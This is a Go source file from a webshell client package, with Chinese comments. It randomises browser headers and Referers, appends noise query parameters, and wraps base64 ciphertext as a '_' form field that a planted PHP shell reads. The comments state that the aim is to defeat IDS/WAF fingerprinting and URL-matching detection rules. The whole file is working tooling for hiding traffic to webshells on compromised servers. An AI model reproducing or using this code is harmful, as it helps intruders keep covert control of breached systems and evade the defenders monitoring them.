package webshell

import (
	"crypto/rand"
	"encoding/hex"
	"math/big"
	"net/http"
	"net/url"
	"strings"
)

// ─── 流量伪装：随机化请求特征，降低 IDS/WAF 流量指纹匹配率 ─────────────────────

var stealthUAs = []string{
	// Chrome Windows
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
	// Edge
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
	// Firefox Windows
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
	// Chrome macOS
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
	// Safari macOS
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
	// Firefox macOS
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0",
	// Chrome Linux
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
	// Mobile Chrome
	"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 17_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1",
	// Curl/Wget（某些 API 场景）
	"curl/8.7.1",
	"Wget/1.21.4",
}

var stealthAccepts = []string{
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
	"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
	"application/json, text/plain, */*",
	"*/*",
	"text/html, */*; q=0.01",
}

var stealthLangs = []string{
	"zh-CN,zh;q=0.9,en;q=0.8",
	"en-US,en;q=0.9",
	"en-GB,en;q=0.9,zh-CN;q=0.8,zh;q=0.7",
	"zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7",
	"ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7",
	"ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7",
	"ru-RU,ru;q=0.9,en;q=0.8",
	"de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7",
}

// stealthReferers 伪造来源：看起来像从常见网站跳转过来的请求。
// 空字符串表示"此次不加 Referer"（正常用户直接输入 URL 也不发 Referer）。
var stealthReferers = []string{
	"",  // 直接访问（不加 Referer）
	"",  // 提高无 Referer 概率（约 25%）
	"https://www.baidu.com/",
	"https://www.google.com/search?q=",
	"https://github.com/",
	"https://stackoverflow.com/",
	"https://www.bing.com/search?q=",
	"https://cn.bing.com/search?q=",
	"https://mp.weixin.qq.com/",
	"https://www.csdn.net/",
}

// stealthCacheControls 随机化缓存控制头。
var stealthCacheControls = []string{
	"max-age=0",
	"no-cache",
	"",
}

// cryptoRandN 用密码学安全随机数生成 [0,n) 的整数索引。
func cryptoRandN(n int) int {
	if n <= 1 {
		return 0
	}
	v, err := rand.Int(rand.Reader, big.NewInt(int64(n)))
	if err != nil {
		return 0
	}
	return int(v.Int64())
}

func pickFrom(ss []string) string {
	if len(ss) == 0 {
		return ""
	}
	return ss[cryptoRandN(len(ss))]
}

// applyStealthHeaders 为 HTTP 请求注入随机化请求头，模拟真实浏览器流量特征。
// 调用后 customHeaders 仍可覆盖特定字段。
func applyStealthHeaders(req *http.Request) {
	req.Header.Set("User-Agent", pickFrom(stealthUAs))
	req.Header.Set("Accept", pickFrom(stealthAccepts))
	req.Header.Set("Accept-Language", pickFrom(stealthLangs))
	req.Header.Set("Accept-Encoding", "gzip, deflate, br")

	if ref := pickFrom(stealthReferers); ref != "" {
		req.Header.Set("Referer", ref)
	}
	if cc := pickFrom(stealthCacheControls); cc != "" {
		req.Header.Set("Cache-Control", cc)
	}
	req.Header.Set("Connection", "keep-alive")
}

// addNoisyParam 在 URL 中追加一个随机无意义查询参数（如 ?_t=a3f2b1），
// 使每次请求 URL 不完全相同，规避基于 URL 精确匹配的检测规则。
func addNoisyParam(rawURL string) string {
	b := make([]byte, 4)
	_, _ = rand.Read(b) //nolint:gosec
	noise := hex.EncodeToString(b)

	u, err := url.Parse(rawURL)
	if err != nil {
		return rawURL
	}
	q := u.Query()
	// 随机选择参数名，避免固定 "_t=" 模式
	paramNames := []string{"_t", "_r", "ts", "cb", "v", "_", "rand", "nc"}
	q.Set(pickFrom(paramNames), noise)
	u.RawQuery = q.Encode()
	return u.String()
}

// wrapBodyAsForm 将 base64 密文包装成 HTML 表单字段格式（`_=<base64>`），
// 使流量看起来像普通 AJAX POST 而非裸 base64 流。
// 对应 PHP shell 使用 $_POST['_'] 读取。
func wrapBodyAsForm(b64body string) string {
	return "_=" + url.QueryEscape(b64body)
}

// unwrapFormBody 从 `_=<base64>` 格式提取原始 base64 密文（测试用）。
func unwrapFormBody(body string) string {
	if !strings.HasPrefix(body, "_=") {
		return body
	}
	v, err := url.QueryUnescape(body[2:])
	if err != nil {
		return body[2:]
	}
	return v
}
